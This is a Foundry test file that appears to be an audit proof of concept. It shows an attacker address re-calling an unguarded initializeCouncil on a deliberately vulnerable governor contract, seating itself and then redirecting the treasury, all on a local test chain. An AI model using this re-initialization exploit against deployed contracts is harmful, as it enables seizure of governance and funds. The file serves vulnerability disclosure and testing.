// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {Test} from "forge-std/Test.sol";
import {MockERC20} from "../contracts/mocks/MockERC20.sol";
import {VulnX100Governor, IVotesLike} from "../contracts/targets/VulnX100Governor.sol";

/// PoC — [VULN-1] Governance seat hijacking on the LOCAL TEST CHAIN.
/// Proves an unauthorized address can re-initialize the council and install
/// itself as the sole council member. No real assets; simulation only.
contract SeatHijackTest is Test {
    MockERC20 token;
    VulnX100Governor gov;

    address legitFoundation = makeAddr("foundation");
    address attacker = makeAddr("attacker");

    function setUp() public {
        token = new MockERC20("X100", "X100");
        gov = new VulnX100Governor(IVotesLike(address(token)));

        // Legit launch: foundation seats the council.
        address[] memory members = new address[](1);
        members[0] = legitFoundation;
        gov.initializeCouncil(members);
    }

    function test_attacker_hijacks_council_seat() public {
        assertTrue(gov.isCouncil(legitFoundation), "precondition: foundation seated");
        assertFalse(gov.isCouncil(attacker), "precondition: attacker not seated");
        assertTrue(gov.councilInitialized(), "council already initialized once");

        // EXPLOIT: re-initialize with only the attacker. The guard flag is ignored.
        vm.prank(attacker);
        address[] memory evil = new address[](1);
        evil[0] = attacker;
        gov.initializeCouncil(evil);

        // Attacker now holds a privileged council seat.
        assertTrue(gov.isCouncil(attacker), "EVIDENCE: attacker hijacked a council seat");
        // And can repoint the treasury pointer (council-gated) — full control of the seat.
        vm.prank(attacker);
        gov.setTreasury(attacker);
        assertEq(address(gov.treasury()), attacker, "EVIDENCE: attacker controls treasury pointer");
    }
}
